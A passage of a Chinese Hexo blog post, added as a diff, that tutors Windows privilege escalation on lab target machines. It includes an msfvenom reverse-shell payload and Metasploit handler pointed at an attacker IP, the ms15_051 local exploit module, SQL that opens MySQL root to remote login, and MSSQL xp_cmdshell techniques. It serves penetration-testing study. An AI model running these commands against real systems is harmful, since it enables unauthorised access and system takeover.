@@ -1,0 +1,698 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="G00d">
+
+
+    <meta name="subtitle" content="没有人会一直一帆风顺，失败和挫折才是人生常态">
+
+
+
+    <meta name="keywords" content="G00dddd">
+
+
+<title>内网渗透-Windows提权梳理 | G00d`s Blog</title>
+
+
+
+    <link rel="icon" href="../favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="../css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="../js/script.js"></script>
+    
+    <script src="../js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //创建雪花元素
+    function snow() {
+      //获取视窗的宽高
+      var width = window.innerWidth;
+      var height = window.innerHeight;
+  
+      var snow = document.createElement("div");             //创建元素
+  
+      //初始化雪花样式
+      size = Math.random() * 15 + 10;                          //随机生成雪花大小
+      snow.style.width = size + "px";
+      snow.style.height = size + "px";
+      snow.style.background = "url(img/雪花" + Math.floor((Math.random()*6)+1) + ".png) no-repeat";   //1-6随机选择雪花的图片
+      // snow.style.background = "url(./雪花.png) no-repeat";
+      snow.style.backgroundSize = '100% 100%';
+      snow.style.position = "fixed";                        //元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会移动
+      snow.style.filter = "blur(1px)";                      //给图片设置高斯模糊
+      snow.style.left = Math.random() * width + 'px';         //随机生成雪花的初始位置
+      snow.style.top = "10px";
+      snow.style.opacity = parseInt(Math.random()*10)/2;   //随机生成雪花的透明度
+  
+      //向body添加元素
+      document.body.appendChild(snow);
+  
+      //创建定时器，每30ms雪花下落一次
+      var timer = setInterval(function () {
+        snow.style.top = parseInt(snow.style.top) + 3 + 'px';     //每次下落3px
+  
+        //当雪花到达底部后清除元素
+        if (parseInt(snow.style.top) >= height) {
+          clearInterval(timer);
+          snow.parentNode.removeChild(snow)
+        }
+      }, 30)
+    }
+  
+    //页面加载完成执行函数
+    window.onload = function play() {
+      //创建定时器，每300ms生成一朵雪花
+      setInterval(function () {
+        snow()
+      }, 300)
+    }
+  </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //蜘蛛网特效
+    !
+    function() {
+        function n(n, e, t) {
+            return n.getAttribute(e) || t
+        }
+        function e(n) {
+            return document.getElementsByTagName(n)
+        }
+        function t() {
+            var t = e("script"),
+            o = t.length,
+            i = t[o - 1];
+            return {
+                l: o,
+                z: n(i, "zIndex", -1),
+                o: n(i, "opacity", .9),   //透明度
+                c: n(i, "color", "255, 102, 153"),   //颜色
+                n: n(i, "count", 99)
+            }
+        }
+        function o() {
+            a = m.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+            c = m.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
+        }
+        function i() {
+            r.clearRect(0, 0, a, c);
+            var n, e, t, o, m, l;
+            s.forEach(function(i, x) {
+                for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 : 1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1, 1), e = x + 1; e < u.length; e++) n = u[e],
+                null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l = o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o, i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t / 2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y), r.lineTo(n.x, n.y), r.stroke()))
+            }),
+            x(i)
+        }
+        var a, c, u, m = document.createElement("canvas"),
+        d = t(),
+        l = "c_n" + d.l,
+        r = m.getContext("2d"),
+        x = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
+        function(n) {
+            window.setTimeout(n, 1e3 / 45)
+        },
+        w = Math.random,
+        y = {
+            x: null,
+            y: null,
+            max: 2e4
+        };
+        m.id = l,
+        m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z + ";opacity:" + d.o,
+        e("body")[0].appendChild(m),
+        o(),
+        window.onresize = o,
+        window.onmousemove = function(n) {
+            n = n || window.event,
+            y.x = n.clientX,
+            y.y = n.clientY
+        },
+        window.onmouseout = function() {
+            y.x = null,
+            y.y = null
+        };
+        for (var s = [], f = 0; d.n > f; f++) {
+            var h = w() * a,
+            g = w() * c,
+            v = 2 * w() - 1,
+            p = 2 * w() - 1;
+            s.push({
+                x: h,
+                y: g,
+                xa: v,
+                ya: p,
+                max: 6e3
+            })
+        }
+        u = s.concat([y]),
+        setTimeout(function() {
+            i()
+        },
+        100)
+    } ();
+
+    //蜘蛛网特效
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">G00d&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">G00d&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">内网渗透-Windows提权梳理</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">G00d</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十二月 18, 2024&nbsp;&nbsp;19:26:16</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="../categories/%E5%86%85%E7%BD%91/">内网</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过利用操作系统中的漏洞或者配置错误，是的攻击者能够从普通用户权限提升为管理员权限（或更高级的系统权限）。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在Windows中，权限大概分为四种：</span><br><span class="line"></span><br><span class="line">    <span class="literal">User</span>：普通用户权限，默认不允许修改系统的设置或用户资料</span><br><span class="line">    Administrator：管理员权限，可以利用Windows的机制将自己提升为<span class="params">System</span>权限</span><br><span class="line">    <span class="params">System</span>：系统权限，可以对SAM等敏感文件进行读取</span><br><span class="line">    TrustedInstaller：最高权限，不涉及，作用于系统文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">提升权限（也称提权）的方式分为以下两类：</span><br><span class="line"></span><br><span class="line">纵向提权：低权限角色获得高权限角色的权限。例如，一个WebShell权限通过提权，拥有了管理员权限</span><br><span class="line">横向提权：获取同级别角色的权限。例如，在系统<span class="selector-tag">A</span>中获取了系统<span class="selector-tag">B</span>的权限</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">提权方法</span><br><span class="line"></span><br><span class="line">系统内核溢出漏洞提权</span><br><span class="line">数据库提权</span><br><span class="line">错误的系统配置提权</span><br><span class="line">组策略首选项提权</span><br><span class="line">Web中间件漏洞提权</span><br><span class="line"><span class="function"><span class="title">DLL</span><span class="params">(动态库)</span></span>劫持提权</span><br><span class="line">滥用高权限令牌提权</span><br><span class="line">第三方软件/服务提权</span><br></pre></td></tr></table></figure>
+
+<h1 id="2-各种姿势"><a href="#2-各种姿势" class="headerlink" title="2.各种姿势"></a>2.各种姿势</h1><h2 id="1-系统内核溢出提权-缓冲区溢出漏洞"><a href="#1-系统内核溢出提权-缓冲区溢出漏洞" class="headerlink" title="1.系统内核溢出提权(缓冲区溢出漏洞)"></a>1.系统内核溢出提权(缓冲区溢出漏洞)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一大类是系统内核溢出提权，俗称PWN洞，这也就是WEB和PWN不分家的原因。基本原理是攻击者利用<span class="string">&quot;缓冲区溢出漏洞&quot;</span>修改内存中变量的值，甚至可以劫持进程，执行反弹shell等一系列操作。</span><br><span class="line">如果是空余时间不太多的师傅不太建议学原理，这又是一门新课了。</span><br><span class="line">步骤：：</span><br><span class="line">(1)信息收集,例如查看当前权限,查看版本、补丁等 </span><br><span class="line"><span class="built_in">whoami</span> /groups 查看系统组以及当前权限</span><br><span class="line">systeminfo 查看补丁信息</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217082434755.png" alt="image-20241217082434755"></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">2</span>)根据收集到的信息确定可利用漏洞</span><br><span class="line">除了手动查找也可以利用工具查找</span><br><span class="line">Windows-Exploit-Suggester是一款提权辅助工具</span><br><span class="line">地址： https:<span class="comment">//github.com/GDSSecurity/Windows-Exploit-Suggester</span></span><br><span class="line"></span><br><span class="line">先更新</span><br><span class="line">python2 windows-exploit-suggester<span class="selector-class">.py</span> <span class="attr">--update</span> </span><br><span class="line"></span><br><span class="line">然后在靶机导出systeminfo</span><br><span class="line">C:\Users\Administrator&gt;cd Desktop</span><br><span class="line">C:\Users\Administrator\Desktop&gt;systeminfo &gt; systeminfo<span class="selector-class">.txt</span></span><br><span class="line"></span><br><span class="line">再查找   这里的systeminfo<span class="selector-class">.txt</span> 是用靶机导出的</span><br><span class="line">python2 windows-exploit-suggester<span class="selector-class">.py</span> -d  <span class="number">2024</span>-<span class="number">12</span>-<span class="number">07</span>-mssb<span class="selector-class">.xls</span> <span class="attr">--systeminfo</span> systeminfo<span class="selector-class">.txt</span></span><br><span class="line"></span><br><span class="line">这两个是在线的exp查找网站</span><br><span class="line">https:<span class="comment">//i.hacking8.com/tiquan</span></span><br><span class="line">https:<span class="comment">//patchchecker.com/</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">3</span>)根据漏洞查找EXP</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/offensive-security/</span>exploitdb</span><br><span class="line">https:<span class="regexp">//</span>www.exploit-db.com</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/Heptagrams/</span>Heptagram<span class="regexp">/tree/m</span>aster<span class="regexp">/Windows/</span>Elevation</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(4)MSF提权 </span><br><span class="line"></span><br><span class="line">先生成一个shell.exe</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=192.168.240.130 <span class="attribute">LPORT</span>=1000 -f exe &gt; shell.exe</span><br><span class="line">传到靶机上面</span><br><span class="line"></span><br><span class="line">攻击机：</span><br><span class="line">use exploit/multi/handler </span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost  192.168.240.130</span><br><span class="line"><span class="built_in">set</span> lport 1000</span><br><span class="line"><span class="built_in">run</span></span><br><span class="line">靶机：</span><br><span class="line">双击shell.exe</span><br><span class="line"></span><br><span class="line">这时候肯定就拿到shell了 注意不需要进入shell下，就在metepreter下就可以了</span><br><span class="line"><span class="built_in">run</span> post/windows/gather/enum_patches  #获得systeminfo并且输出能够提权的exp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//90733105e405c4854a2f9490130d07f5.png" alt="img"></p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">存在+ 号的一般都是可以利用的</span><br><span class="line">使用获得的提权漏洞所对应的模块 <span class="comment">#这里使用第四个ms15提权</span></span><br><span class="line">先把session放到后台 用background或者ctrl+z</span><br><span class="line">use exploit/windows/<span class="keyword">local</span>/ms15_051_client_copy_image </span><br><span class="line"><span class="keyword">set</span> session <span class="number">2</span> <span class="comment">#要用sessions确认自己的反弹shell在哪个session下</span></span><br><span class="line"><span class="built_in">run</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//c2d8b8bf809d60432c7cfd2e35c12e25.png" alt="img"></p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">5</span>)获取EXP / POC</span><br><span class="line">安全漏洞库：</span><br><span class="line"><span class="symbol">https:</span><span class="comment">//nvd.nist.gov</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//cve.scap.org.cn</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//www.seebug.org</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//www.cnvd.org.cn</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//www.cnnvd.org.cn</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//www.securityfocus.com</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//www.nsfocus.net/vulndb</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//msrc.microsoft.com/update-guide</span></span><br><span class="line"></span><br><span class="line">KB、POC、EXP查找：</span><br><span class="line"><span class="symbol">https:</span><span class="comment">//0day.today</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//www.exploit-db.com</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//kernelhub.ascotbe.com</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//github.com/Ascotbe/Kernelhub</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//github.com/qazbnm456/awesome-cve-poc</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//github.com/SecWiki/windows-kernel-exploits</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//www.catalog.update.microsoft.com/home.aspx</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="2-Windows数据库提权"><a href="#2-Windows数据库提权" class="headerlink" title="2.Windows数据库提权"></a>2.Windows数据库提权</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这种情况一般需要二级提权甚至三级提权。由<span class="keyword">SQL</span>注入，数据库泄漏，弱口令攻击，未授权访问等拿到数据库权限，接着需要继续提权来获得administrator权限</span><br><span class="line"></span><br><span class="line">大概流程：：</span><br><span class="line">网站存在<span class="keyword">SQL</span>注入漏洞</span><br><span class="line">数据库的存储文件或备份文件</span><br><span class="line">网站应用源码中的数据库配置文件</span><br><span class="line">采用工具或脚本爆破(需解决外联问题)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">利用数据库自动化提权项目进行连接</span><br><span class="line">MDUT-图形化</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/SafeGroceryStore/</span>MDUT</span><br><span class="line"></span><br><span class="line">Sylas-图形化</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/Ryze-T/</span>Sylas</span><br><span class="line"></span><br><span class="line">RequestTemplate-图形化</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/1n7erface/</span>RequestTemplate</span><br><span class="line"></span><br><span class="line">Databasetools-命令行</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/Hel10-Web/</span>Databasetools</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">如何解决外联问题：</span><br><span class="line">-利用已知Web权限建立代理节点，然后自动化提权项目在连接这个代理节点（等同于本地连接）</span><br><span class="line">-利用已知权限执行<span class="keyword">SQL</span>开启外联（让数据库支持外联）</span><br><span class="line"></span><br><span class="line">MYSQL(默认不支持不外联)</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">&#x27;帐号&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;密码&#x27;</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> <span class="keyword">OPTION</span>;</span><br><span class="line">flush <span class="keyword">privileges</span>;</span><br><span class="line"></span><br><span class="line">MSSQL(默认支持外联)</span><br><span class="line">EXEC sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure <span class="string">&#x27;Ad Hoc Distributed Queries&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line">Oracle(默认支持外联)</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">SYSTEM</span> <span class="keyword">SET</span> REMOTE_LOGIN_PASSWORDFILE=<span class="keyword">EXCLUSIVE</span> SCOPE=SPFILE;</span><br><span class="line">SHUTDOWN <span class="keyword">IMMEDIATE</span>;</span><br><span class="line">STARTUP;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">演示案例<span class="number">1</span>-Web到Win-数据库提权<span class="built_in">-MYSQL</span>(默认<span class="number">3306</span>端口)</span><br><span class="line">MYSQL：PHP+MYSQL 以web入口提权</span><br><span class="line">条件：ROOT密码(高版本的-secure-file-priv没有进行目录限制，如果进行了目录限制就会导致提权失败)</span><br><span class="line">技术：UDF <span class="built_in">MOF</span>(win2008之后就用不了) 启动项 反弹Shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217085749847.png" alt="image-20241217085749847"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217085854426.png" alt="image-20241217085854426"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql默认不支持外联，需要用<span class="keyword">sql</span>语句运行root账户支持外联</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;10idc.com&#x27;</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> <span class="keyword">OPTION</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217090325404.png" alt="image-20241217090325404"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217090527999.png" alt="image-20241217090527999"></p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">同时在信息收集的时候也可以特地看有没有%，如果有就是默认支持了外联</span><br><span class="line">用MDUT工具连接数据库并且反弹<span class="keyword">shell</span><span class="language-bash">给我kali</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217093114468.png" alt="image-20241217093114468"></p>
+<p>​	<img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217090708530.png" alt="image-20241217090708530"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217090749326.png" alt="image-20241217090749326"></p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">演示案例2-Web到<span class="keyword">Win</span>-数据库提权-MSSQL(默认1433端口)</span><br><span class="line">MSSQL：.<span class="keyword">NET</span>+MSSQL 以web入口提权</span><br><span class="line">条件：<span class="keyword">sa</span>密码</span><br><span class="line">技术：xp_cmdshell sp_oacreate CLR 沙盒</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217091252801.png" alt="image-20241217091252801"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这个演示环境的mssql不需要再用<span class="keyword">sql</span>语句开启外联</span><br><span class="line">RequestTemplate</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217093146099.png" alt="image-20241217093146099"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217093209637.png" alt="image-20241217093209637"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217093221144.png" alt="image-20241217093221144"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217093242124.png" alt="image-20241217093242124"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217093305787.png" alt="image-20241217093305787"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217093320294.png" alt="image-20241217093320294"></p>
